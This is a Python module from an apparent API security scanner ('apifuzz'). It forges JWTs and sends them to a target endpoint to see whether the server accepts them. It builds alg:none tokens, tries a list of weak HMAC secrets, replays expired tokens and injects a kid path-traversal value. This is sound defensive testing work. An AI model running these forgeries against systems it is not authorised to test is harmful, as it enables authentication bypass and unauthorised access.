"""JWT-specific attacks.

If the provided Authorization header carries a JWT, run a small battery of
forged tokens against a representative endpoint and flag any that the server
accepts (HTTP 2xx).

All JWT manipulation is implemented with stdlib only (`base64`, `hmac`,
`hashlib`, `json`) so apifuzz keeps its dependency footprint tight.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Dict, List, Optional, Tuple

import requests

from analyzer import Finding


CATEGORY = "jwt"

# Try-list for weak HMAC secrets.
WEAK_HMAC_SECRETS = [
    "secret", "secret123", "password", "1234", "12345", "123456",
    "changeme", "default", "jwt", "key", "test", "admin", "your-256-bit-secret",
    "", "null", "none",
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    padding = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)


def parse_bearer_jwt(auth_header: Optional[str]) -> Optional[Tuple[Dict, Dict, bytes, str]]:
    """Parse a Bearer JWT auth header. Returns (header, payload, signature, raw_token)
    or None if it doesn't look like a JWT.
    """
    if not auth_header:
        return None
    val = auth_header.strip()
    if val.lower().startswith("authorization:"):
        val = val.split(":", 1)[1].strip()
    if val.lower().startswith("bearer "):
        val = val[7:].strip()
    parts = val.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        signature = _b64url_decode(parts[2]) if parts[2] else b""
    except Exception:
        return None
    if not isinstance(header, dict) or "alg" not in header:
        return None
    return header, payload, signature, val


def _build_token(header: Dict, payload: Dict, signature: bytes) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = _b64url_encode(signature) if signature else ""
    return f"{h}.{p}.{s}"


def _sign_hs256(header: Dict, payload: Dict, secret: bytes) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _mk(
    severity: str,
    title: str,
    *,
    endpoint: str,
    method: str,
    request_url: str,
    evidence: str,
    payload: str = "",
    technique: str = "JWT forgery",
    status_code: int = 0,
    request_headers: Optional[Dict[str, str]] = None,
    response_body: Optional[str] = None,
    response_headers: Optional[Dict[str, str]] = None,
) -> Finding:
    from analyzer import capture_body
    captured, truncated = capture_body(response_body)
    return Finding(
        severity=severity,
        category=CATEGORY,
        title=title,
        endpoint=endpoint,
        method=method,
        parameter="Authorization",
        location="header",
        payload=payload,
        technique=technique,
        evidence=evidence,
        status_code=status_code,
        response_time_ms=0,
        request_url=request_url,
        request_headers=dict(request_headers or {}),
        request_body=None,
        response_body=captured,
        response_headers=dict(response_headers or {}),
        response_truncated=truncated,
    )


# ---------------------------------------------------------------------------
# Probes
# ---------------------------------------------------------------------------

def run_jwt_attacks(
    *,
    auth_header: Optional[str],
    target_url: str,
    target_method: str,
    target_endpoint_path: str,
    baseline_status: int,
    session: requests.Session,
    timeout: float,
) -> List[Finding]:
    """Attempt JWT forgeries against the given target endpoint."""
    parsed = parse_bearer_jwt(auth_header)
    if parsed is None:
        return []
    header, payload, signature, raw_token = parsed
    findings: List[Finding] = []

    # If the original auth was already accepted (2xx), distinguishing forgery
    # success would need a comparison endpoint — but typically users supply
    # tokens that authenticate, and our baseline either 2xx'd or 401'd. We only
    # flag forgeries that produce a 2xx when the *unauth* baseline would be 401.
    # As a proxy: we just call with each forged token and look for 2xx.

    def _try(token: str, title: str, severity: str, evidence: str, technique: str):
        forged_headers = {"Authorization": f"Bearer {token}"}
        try:
            resp = session.request(
                target_method,
                target_url,
                headers=forged_headers,
                timeout=timeout,
                allow_redirects=False,
            )
        except requests.exceptions.RequestException:
            return
        if 200 <= resp.status_code < 300:
            findings.append(
                _mk(
                    severity,
                    title,
                    endpoint=target_endpoint_path,
                    method=target_method,
                    request_url=target_url,
                    evidence=f"{evidence} (HTTP {resp.status_code}).",
                    payload=token,
                    technique=technique,
                    status_code=resp.status_code,
                    request_headers=forged_headers,
                    response_body=resp.text or "",
                    response_headers=dict(resp.headers),
                )
            )

    # 1. alg: none
    none_header = {**header, "alg": "none"}
    none_token = _build_token(none_header, payload, b"")
    _try(
        none_token,
        "JWT alg:none accepted",
        "critical",
        "Server accepted a token forged with alg=none and an empty signature",
        "alg:none",
    )

    # 2. Weak HMAC secret (only if original header.alg is an HS variant)
    alg = str(header.get("alg", "")).upper()
    if alg.startswith("HS"):
        for secret in WEAK_HMAC_SECRETS:
            try:
                forged = _sign_hs256(header, payload, secret.encode())
            except Exception:
                continue
            forged_headers = {"Authorization": f"Bearer {forged}"}
            try:
                resp = session.request(
                    target_method, target_url, headers=forged_headers, timeout=timeout, allow_redirects=False
                )
            except requests.exceptions.RequestException:
                continue
            if 200 <= resp.status_code < 300:
                findings.append(
                    _mk(
                        "critical",
                        f"JWT signed with weak HMAC secret accepted: {secret!r}",
                        endpoint=target_endpoint_path,
                        method=target_method,
                        request_url=target_url,
                        evidence=f"Server accepted a token signed with HMAC secret {secret!r} (HTTP {resp.status_code}).",
                        payload=forged,
                        technique="weak HMAC secret",
                        status_code=resp.status_code,
                        request_headers=forged_headers,
                        response_body=resp.text or "",
                        response_headers=dict(resp.headers),
                    )
                )
                break  # one is enough

    # 3. Expired token replay (only when 'exp' present and in the past, OR force it)
    expired_payload = dict(payload)
    expired_payload["exp"] = int(time.time()) - 3600
    # Reuse the original signature with the modified payload. A correctly
    # validating server will reject (signature mismatch); an incorrectly
    # validating one might accept the unchanged signature.
    expired_token = _build_token(header, expired_payload, signature)
    _try(
        expired_token,
        "Expired JWT accepted (with original signature)",
        "high",
        "Server accepted a token whose 'exp' claim was set to an hour ago",
        "expired token replay",
    )

    # 4. `kid` injection — path traversal style
    if "kid" in header or alg.startswith("HS") or alg.startswith("RS"):
        kid_header = dict(header)
        kid_header["kid"] = "../../../../../../dev/null"
        # Sign with empty HMAC secret — many libraries default to "" when kid resolves nowhere.
        try:
            kid_token = _sign_hs256({**kid_header, "alg": "HS256"}, payload, b"")
        except Exception:
            kid_token = _build_token({**kid_header, "alg": "none"}, payload, b"")
        _try(
            kid_token,
            "JWT kid path-traversal accepted",
            "high",
            "Server accepted a token with kid pointing at a traversable file resolving to empty bytes",
            "kid injection",
        )

    return findings
